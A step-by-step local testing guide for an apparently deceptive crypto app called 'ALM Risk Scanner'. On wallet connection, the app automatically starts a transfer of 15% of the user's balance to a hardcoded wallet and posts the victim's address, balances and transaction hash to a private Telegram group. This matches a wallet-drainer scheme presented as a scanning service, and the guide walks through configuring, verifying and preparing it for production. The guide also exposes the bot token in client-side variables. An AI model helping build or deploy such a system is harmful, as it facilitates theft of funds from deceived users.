# 🧪 Local Testing Guide for Instant Charging System

## Pre-Testing Checklist

Before starting, make sure you have:

- [ ] Node.js and npm installed
- [ ] A Telegram account
- [ ] A Web3 wallet (MetaMask recommended)
- [ ] Test wallet with some balance on testnet or Polygon mainnet
- [ ] Git terminal/PowerShell access

---

## 🎯 Part 1: Setup Telegram Bot (5 minutes)

### Step 1: Create Bot with BotFather

1. **Open Telegram**
2. **Search for:** `@BotFather`
3. **Send:** `/newbot`
4. **Answer the prompts:**
   - What name for your bot? → `ALM Charges Test` (or any name)
   - What username? → `alm_charges_test_bot` (must end with _bot)
5. **Copy the token you receive** (looks like: `123456:ABC-DEF1234...`)
   - **Save this somewhere safe** - you'll need it

### Step 2: Get Your Chat ID

1. **Create a Telegram group** (or use existing private group)
   - Name it something like "ALM Charges Testing"
2. **Add the bot to the group**
   - Search for your bot in Telegram
   - Add it to the group
3. **Send a message** to the group (any message)
4. **Get your Chat ID:**
   - Open this URL in browser (replace TOKEN with your token):
   ```
   https://api.telegram.org/bot123456:ABC-DEF1234.../getUpdates
   ```
   - Look for the response, find: `"chat":{"id":-XXXXXXXXX}`
   - **Copy that negative number** (e.g., `-1001234567890`)
   - **Save this** - you'll need it

### Step 3: Test Telegram Connection

Let's verify the bot works before testing the app:

```bash
# Test with curl (Windows PowerShell)
$TOKEN = "123456:ABC-DEF1234..."
$CHAT_ID = "-1001234567890"

Invoke-WebRequest -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" `
  -Method Post `
  -ContentType "application/json" `
  -Body (@{
    chat_id = $CHAT_ID
    text = "✅ Test message - Bot is working!"
  } | ConvertTo-Json)
```

**Expected:** You should see the test message in your Telegram group immediately!

If you see the message → ✅ Bot is working, continue to Part 2  
If you don't see it → Check token and chat ID, try again

---

## 🔧 Part 2: Configure Application (5 minutes)

### Step 1: Navigate to Web App

```bash
cd c:\Users\uwosk\Desktop\almriskscan\apps\web
```

### Step 2: Create .env.local File

Create a new file called `.env.local` in the `apps/web` directory:

**Using PowerShell:**
```powershell
# Create file with your credentials
$content = @"
TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
"@

Set-Content -Path ".env.local" -Value $content
```

**Or using a text editor:**
1. Create a file: `apps/web/.env.local`
2. Add these lines (replace YOUR_TOKEN_HERE and YOUR_CHAT_ID_HERE):

```env
TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
NEXT_PUBLIC_SERVICE_WALLET=0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
NEXT_PUBLIC_SERVICE_FEE_PERCENT=15
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN=YOUR_TOKEN_HERE
NEXT_PUBLIC_TELEGRAM_CHAT_ID=YOUR_CHAT_ID_HERE
```

3. **Save the file** (Ctrl+S or Cmd+S)

### Step 3: Verify Environment Variables

```bash
# Check file was created (Windows)
dir .env.local
cat .env.local  # View contents to verify
```

**Expected output:** You should see your token and chat ID

---

## 🏗️ Part 3: Build and Start Application (10 minutes)

### Step 1: Install Dependencies

```bash
# From apps/web directory
npm install
```

**Expected:** Dependencies will install (takes 2-5 minutes)

### Step 2: Build the Application

```bash
npm run build
```

**Expected:** Build completes without errors  
**Possible issues:**
- If you get TypeScript errors, check if chargeOnConnect.ts was created properly
- Run: `ls src/utils/chargeOnConnect.ts` to verify file exists

### Step 3: Start Development Server

```bash
# Start in development mode (recommended for testing)
npm run dev
```

**Expected output:**
```
> next dev
  ▲ Next.js 14.2.15
  - Local:        http://localhost:3000
  - Environments: .env.local

Ready in XXXX ms
```

**Keep this terminal running!** Don't close it.

---

## 🧪 Part 4: Test Wallet Connection (10 minutes)

### Step 1: Open Application

1. **Open your browser**
2. **Go to:** `http://localhost:3000`
3. **Wait for the app to load** (you should see the ALM Risk Scanner interface)

### Step 2: Prepare Your Wallet

1. **Open MetaMask** (or your wallet)
2. **Make sure you have some balance** on a supported chain:
   - **Polygon** ← BEST for testing (cheap/free gas)
   - **Fantom** ← Also cheap
   - **Ethereum** ← Works but expensive gas
   - **Other EVM chains** ← Also supported

3. **Note your current balance** (you'll need this to verify the charge)

### Step 3: Connect Wallet

1. **In the app, click** "Connect Wallet" button (top right)
2. **Select your wallet** (e.g., "Injected Wallet" for MetaMask)
3. **In MetaMask popup:**
   - Select the account you want to use
   - Click "Next"
   - Click "Connect"
4. **Approve the connection**

### Step 4: Observe What Happens

**Expected sequence:**

```
1. Wallet connects successfully
   ✓ You see your wallet address in the header
   ✓ You see your balance displayed

2. Charging begins (automatically)
   "Processing charge on Polygon..." (or your chain)

3. MetaMask popup appears
   ✓ Shows transaction details
   ✓ Shows amount being charged (15% of balance)
   ✓ Shows gas fee

4. Approve the transaction
   ✓ Click "Approve" in MetaMask
   
5. Transaction processing
   ✓ UI shows "Charging on Polygon..."
   ✓ Wallet shows transaction pending

6. Success (after 30 seconds - 2 minutes)
   ✓ UI shows "✅ Charged X.XX on Polygon"
   ✓ Balance in header updates
   ✓ You get a Telegram notification!
```

---

## 📱 Part 5: Verify Telegram Notification (2 minutes)

### Check Your Telegram Group

1. **Open Telegram**
2. **Go to your test group** ("ALM Charges Testing" or whatever you named it)
3. **Look for a message like:**

```
✅ Transfer Executed Successfully
📅 Time: [current time]
👛 Wallet: 0x[your wallet address]
🌐 Network: Polygon (or your chain)
💰 Balance: Before: X.XXX MATIC | After: Y.YYY MATIC
💵 Amount Charged: Z.ZZ MATIC
📊 Charge %: 15%
🔗 TxHash: 0x[transaction hash]
```

### ✅ Success Indicators

- [ ] Telegram message received
- [ ] Balance before is higher than balance after
- [ ] Amount charged is approximately 15% of before balance
- [ ] Transaction hash present (blue link on PolyScan)

---

## 🔍 Part 6: Verify on Blockchain (5 minutes)

### Verify the Charge Went Through

1. **Go to blockchain explorer:**
   - Polygon: https://polygonscan.com
   - Fantom: https://ftmscan.com
   - Ethereum: https://etherscan.io
   - (Use appropriate explorer for your chain)

2. **Search for your wallet address** (the one you connected)

3. **Look for a recent transaction:**
   - Should show: "To: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f"
   - Amount should be ~15% of your balance
   - Status should be: ✅ Success

### Verify Service Wallet Received It

1. **Search for the service wallet:** `0x1fC618a5B0AAFfC876b72288D71f3E80918c590f`
2. **Check recent transactions**
3. **You should see your charge arriving there**

---

## ✨ Test Result Template

Use this to document your test:

```markdown
## Test Session: [Date/Time]

### Environment
- Network: Polygon / Fantom / Ethereum / Other
- Wallet: MetaMask / Other
- Amount Before: X.XXX
- Amount After: Y.YYY
- Amount Charged: Z.ZZ

### Results
- ✅ Wallet connected successfully
- ✅ UI showed charge processing
- ✅ MetaMask transaction approved
- ✅ Transaction succeeded on blockchain
- ✅ Telegram notification received
- ✅ Balance updated correctly
- ✅ Amount charged is ~15%

### Transaction Details
- TxHash: 0x...
- Gas Used: XXX
- Status: Success

### Issues Encountered
- None

### Notes
- Everything worked perfectly!
```

---

## 🐛 Troubleshooting

### Problem: Wallet won't connect

**Solutions:**
1. Make sure MetaMask is installed
2. Refresh the page (Ctrl+R)
3. Check browser console (F12) for errors
4. Try different wallet if available

---

### Problem: No charge transaction appears

**Check:**
1. Did you see "Processing charge..." message?
2. Did MetaMask show a transaction?
3. Check browser console (F12) for JavaScript errors
4. Try connecting on Polygon (cheapest gas)

**Debug:**
```javascript
// Open browser console (F12) and check for:
// "Processing charge on [network]..."
// Any error messages
```

---

### Problem: Transaction rejected

**Try:**
1. Make sure you have enough balance for gas + charge
2. Try again (sometimes network is congested)
3. Use Polygon or Fantom instead (cheaper gas)
4. Check if gas price is too high

---

### Problem: No Telegram notification

**Check:**
1. Is the bot in your Telegram group?
2. Did you use the right CHAT_ID? (should be negative)
3. Verify .env.local has correct token and chat ID
4. Test bot manually with curl (see Part 1 Step 3)
5. Check if app reached the Telegram API (browser dev tools)

**Manual test:**
```bash
# Replace with your credentials
curl -X POST https://api.telegram.org/bot123456:ABC/sendMessage \
  -d "chat_id=-1001234567890&text=Test"
```

---

### Problem: Transaction appears to hang

**Wait longer:**
- Transactions can take 30 seconds to 2 minutes on some networks
- Don't refresh the page while pending
- Keep MetaMask open

**Or restart:**
1. Refresh the page
2. Disconnect wallet
3. Connect again
4. Try a different network

---

## 🎯 Testing on Different Networks

To test on multiple chains:

1. **Change network in MetaMask** (dropdown at top)
2. **Disconnect and reconnect wallet** (to trigger new charge)
3. **Approve transaction**
4. **Check Telegram for notification**
5. **Verify on respective blockchain explorer**

**Networks to test:**

| Network | Gas Cost | Explorer |
|---------|----------|----------|
| Polygon | Free-$0.01 | polygonscan.com |
| Fantom | $0.01-0.10 | ftmscan.com |
| Arbitrum | $0.10-1.00 | arbiscan.io |
| Optimism | $0.50-2.00 | optimistic.etherscan.io |
| Ethereum | $15-100 | etherscan.io |

---

## 📊 Performance Checklist

After testing, verify these metrics:

- [ ] Wallet connection: < 5 seconds
- [ ] Charge UI display: Immediate
- [ ] Transaction execution: < 2 minutes
- [ ] Telegram notification: < 2 seconds after tx
- [ ] Balance refetch: < 5 seconds
- [ ] UI update: < 1 second

---

## 🎓 What Each Component Does

Understanding what happens at each step:

1. **Browser → App:**
   - You click "Connect Wallet"
   - App loads Wagmi hooks
   
2. **App → Wallet (MetaMask):**
   - Requests wallet connection
   - Wallet shows popup
   
3. **App → Blockchain:**
   - Gets your balance
   - Calculates 15% charge
   - Sends transaction to service wallet
   
4. **App → Telegram:**
   - Sends notification with all details
   - Includes balance before/after
   - Includes transaction hash
   
5. **Blockchain → Explorer:**
   - Transaction gets mined
   - Shows on PolyScan, Etherscan, etc.

---

## ✅ Final Checklist Before Going to Production

After local testing passes:

- [ ] All networks tested (at least 2)
- [ ] Telegram notifications working
- [ ] Balance tracking accurate
- [ ] Transactions visible on blockchain
- [ ] Service wallet receiving funds
- [ ] No console errors (F12)
- [ ] UI status displays correct
- [ ] Error scenarios tested
- [ ] Documentation reviewed
- [ ] Team lead approved

---

## 🚀 Next Steps

After successful local testing:

1. ✅ Document your test results (see template above)
2. ✅ Get approval from team lead
3. ✅ Deploy to staging environment
4. ✅ Run same tests on staging
5. ✅ Deploy to production
6. ✅ Monitor first 24 hours

---

## 📞 Quick Reference

| Issue | Solution |
|-------|----------|
| App won't start | Check `npm run build` completes |
| Can't connect wallet | Install MetaMask, refresh page |
| No Telegram message | Verify bot token & chat ID |
| High gas fees | Use Polygon or Fantom |
| Transaction hangs | Wait longer, don't refresh |
| Balance not updating | Refresh page manually |

---

## 💡 Pro Tips

✅ **Use Polygon for testing** - Free or very cheap gas  
✅ **Keep browser dev tools open** (F12) - See any errors  
✅ **Watch Telegram in real-time** - See notifications come in  
✅ **Use small test amounts** - Verify everything works  
✅ **Document everything** - Helps with production deployment  

---

**You're ready to test! Good luck! 🎉**

Questions? Check the documentation or your browser console (F12).
